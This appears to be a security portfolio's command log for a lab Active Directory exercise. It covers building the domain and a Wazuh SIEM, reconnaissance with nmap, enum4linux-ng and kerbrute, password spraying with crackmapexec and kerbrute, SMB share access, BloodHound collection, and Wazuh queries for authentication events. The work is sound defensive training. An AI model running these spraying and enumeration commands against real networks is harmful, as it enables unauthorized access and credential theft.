# Operation WeakLink Commands

This file documents the commands used to build, validate, troubleshoot, attack, and investigate the Operation WeakLink Active Directory environment.

> Note: Passwords have been replaced with placeholders for the public portfolio version.

## A. Environment Setup and Active Directory Configuration

These commands were used to build and validate the Active Directory environment.

```powershell
whoami
ipconfig
ipconfig /release
ping 192.168.56.109
net user eren /domain
net user mikasa /domain
net user armin /domain
runas /user:corp\mikasa cmd
runas /user:corp\armin cmd
```

## B. Wazuh and Telemetry Configuration

These commands were used to validate SIEM services, logging, and ingestion.

```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-dashboard
sudo systemctl start filebeat
sudo systemctl restart filebeat
sudo systemctl status filebeat
sudo journalctl -u filebeat -n 20 --no-pager
sudo filebeat test config -c /etc/filebeat/filebeat.yml
curl -k https://localhost:5601
curl -k -u admin:<password> https://localhost:9200
```

## C. Network Configuration and Troubleshooting

These commands were used to stabilize networking across the lab systems.

```bash
ip a
ping -c 3 google.com
sudo nano /etc/resolv.conf
sudo systemctl stop systemd-resolved
sudo nano /etc/netplan/*.yaml
sudo netplan apply
nmcli connection show
nmcli device status
nmcli connection up "Wired connection 1"
```

## D. Tool Installation and Environment Preparation

These commands were used to prepare the Kali Linux attacker machine.

```bash
sudo apt update
sudo apt install crackmapexec enum4linux-ng -y
crackmapexec --version
enum4linux-ng --help
go install github.com/ropnop/kerbrute@latest
export PATH=$PATH:~/go/bin
```

## E. Reconnaissance and Enumeration

These commands were used to identify hosts, exposed services, and Active Directory information.

### Service Enumeration

```bash
nmap -sV 192.168.56.109
sudo nmap -sS -p- 192.168.56.0/24
```

### Domain and SMB Enumeration

```bash
enum4linux-ng 192.168.56.109
```

### Kerberos User Enumeration

```bash
kerbrute userenum -d corp.local --dc 192.168.56.109 users.txt
```

### LDAP Enumeration

```bash
ldapsearch -x -H ldap://192.168.56.109 -b "DC=corp,DC=local"
```

### LDAP Connectivity Validation

```bash
nc -nv 192.168.56.109 389
```

## F. Credential Attacks and Authentication Testing

These commands were used to simulate password attacks and validate authentication behavior.

### CrackMapExec Password Testing

```bash
crackmapexec smb 192.168.56.109 -u users.txt -p '<password>'
crackmapexec smb 192.168.56.109 -u users.txt -p '<password>'
crackmapexec smb 192.168.56.109 -u users.txt -p '<password>' -d corp.local
```

### Kerbrute Password Spraying

```bash
kerbrute passwordspray --dc 192.168.56.109 -d corp.local users.txt '<password>'
```

### Windows Authentication Testing

```powershell
net use \\AD01\IPC$ /user:corp\eren <incorrect-password>
```

## G. SMB Enumeration and Access

These commands were used to enumerate and interact with SMB shares after successful authentication.

### Enumerate Available Shares

```bash
smbclient -L //192.168.56.109 -U eren --option='client min protocol=SMB2'
```

### Access SYSVOL

```bash
smbclient //192.168.56.109/SYSVOL -U corp\\eren
```

### Access NETLOGON

```bash
smbclient //192.168.56.109/NETLOGON -U eren
```

### SMB Session Commands

```text
ls
cd policies
get GptTmpl.inf
```

## H. Active Directory Enumeration and Analysis

These commands were used to collect Active Directory information for analysis.

### BloodHound Collection

```bash
bloodhound-python \
  -u eren \
  -p '<password>' \
  -d corp.local \
  -dc AD01.corp.local \
  -ns 192.168.56.109 \
  -c all
```

### Package BloodHound Output

```bash
zip loot.zip *.json
```

## I. Detection and SIEM Queries

These Wazuh queries were used to identify authentication activity generated during the attack simulation.

### Successful Authentication — Event ID 4624

```text
data.win.system.eventID:4624 AND data.win.eventdata.targetUserName:eren
```

### Failed Authentication — Event ID 4625

```text
data.win.system.eventID:4625
```

### Account Lockout — Event ID 4740

```text
data.win.system.eventID:4740
```

## Command Workflow Summary

The command sequence supported the full Operation WeakLink workflow:

1. Build and validate the Active Directory environment
2. Confirm Wazuh and Filebeat telemetry
3. Troubleshoot networking and DNS
4. Prepare offensive-security tooling
5. Perform network and domain reconnaissance
6. Enumerate valid Active Directory users
7. Simulate password spraying
8. Validate credential-based SMB access
9. Enumerate and access domain shares
10. Collect Active Directory data for BloodHound analysis
11. Review authentication activity in Wazuh
